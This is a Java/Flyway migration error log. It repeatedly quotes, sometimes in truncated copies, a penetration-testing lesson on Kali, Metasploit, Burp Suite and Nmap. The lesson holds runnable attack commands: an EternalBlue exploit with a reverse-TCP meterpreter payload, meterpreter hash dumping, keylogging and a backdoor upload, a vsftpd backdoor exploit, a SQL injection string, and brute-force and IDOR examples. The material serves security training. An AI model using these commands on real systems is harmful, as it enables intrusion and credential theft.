meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:58:12.276 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
